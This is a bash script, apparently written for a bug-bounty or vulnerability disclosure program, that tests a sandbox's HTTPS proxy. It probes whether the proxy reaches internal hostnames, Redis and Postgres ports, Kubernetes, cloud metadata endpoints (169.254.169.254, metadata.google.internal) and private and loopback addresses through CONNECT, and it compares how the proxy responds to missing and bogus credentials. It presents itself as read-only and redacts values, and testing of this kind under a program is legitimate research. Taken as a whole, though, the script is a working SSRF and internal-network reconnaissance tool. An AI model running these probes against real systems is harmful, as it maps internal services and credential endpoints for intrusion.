#!/usr/bin/env bash
# proxybypass_jail_proxy_matrix.sh — H1: Jail-side proxy routing matrix (CodeRabbit VDP).
# READ-ONLY: status-code probes only. Values redacted at source (4ch+len).
# Tests: internal-name resolution through $HTTPS_PROXY (CONNECT = proxy does DNS),
#        CONNECT SSRF, proxy-auth differential, response-header proxy software/cache ID.
echo "PROXY_MATRIX_START"
echo "TS_UTC: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "SCRIPT_SHA256: $( (sha256sum "$0" 2>/dev/null || shasum -a 256 "$0") | awk '{print $1}')"

PX="${HTTPS_PROXY:-${HTTP_PROXY:-}}"
echo "PROXY_ENV_PREFIX=${PX:0:8}...[REDACTED len=${#PX}]"

# --- helper: probe with explicit proxy + header capture ---
# $1=label, $2+=curl args (URL last)
pxprobe() {
  local label="$1"; shift
  local hdr="/tmp/_hdrs_px_$$" code rc
  code=$(curl -sS -m 12 -o /dev/null -D "$hdr" -w '%{http_code}' "$@" 2>/dev/null); rc=$?
  echo "$label -> code=${code:-000} rc=$rc"
  if [ -f "$hdr" ]; then
    grep -iE '^(Via|Age|X-Cache|X-Proxy|Proxy-Auth|X-Forwarded|X-Real|X-Served-By|X-Cache-Hits|Server|CF-RAY)' "$hdr" 2>/dev/null | \
      sed -E 's/^(.+):(.)/\1: <REDACTED>/' | head -6
    rm -f "$hdr"
  fi
}

# --- H1a: Internal name resolution through proxy ---
# HTTPS uses CONNECT tunnel -> proxy does DNS (can it resolve internal names?)
# HTTP uses forward-proxy -> curl does DNS locally first (tests local resolver, not proxy)
echo "== H1a_internal_name_matrix (HTTPS=CONNECT/proxy-DNS; HTTP=forward/local-DNS) =="
# HTTPS through proxy (CONNECT — proxy does DNS)
pxprobe "internal_https"    "https://internal/"
pxprobe "api_https"         "https://api/"
pxprobe "trpc_https"        "https://trpc/"
pxprobe "redis_https"       "https://redis:6379/"
pxprobe "postgres_https"    "https://postgres:5432/"
pxprobe "metadata_https"    "https://metadata.google.internal/computeMetadata/v1/"
pxprobe "kubernetes_https"  "https://kubernetes.default.svc/"
pxprobe "wake_health"       "https://api.agent.coderabbit.ai/api/internal/health"
# HTTP through proxy (forward — curl resolves locally; baseline from PMAJAIL)
pxprobe "internal_http"     "http://internal/"
pxprobe "metadata_http"     "http://metadata.google.internal/computeMetadata/v1/"

# --- H1b: CONNECT SSRF via proxy (Critical if code != 000) ---
echo "== H1b_connect_ssrf (proxy-level CONNECT to private/link-local) =="
pxprobe "connect_imds"      "http://169.254.169.254/"
pxprobe "connect_imds_https""https://169.254.169.254/"
pxprobe "connect_rfc1918"   "https://10.0.0.1/"
pxprobe "connect_17216"     "http://172.16.0.1/"
pxprobe "connect_192168"    "http://192.168.1.1/"
pxprobe "connect_localhost" "http://127.0.0.1/"

# --- H1c: Proxy-auth differential (stripped vs env creds) ---
echo "== H1c_proxy_auth_differential =="
pxprobe "auth_default"  "https://api.github.com/"
pxprobe "auth_stripped" "https://api.github.com/" --proxy-user ""
pxprobe "auth_bogus"    "https://api.github.com/" --proxy-user "bogus:bogus1234"

# --- H1d: Proxy response headers (software ID + shared cache) ---
echo "== H1d_proxy_observables =="
pxprobe "obs_github_1" "https://api.github.com/"
pxprobe "obs_github_2" "https://api.github.com/"
pxprobe "obs_example"  "https://example.com/"
echo "PROXY_MATRIX_END"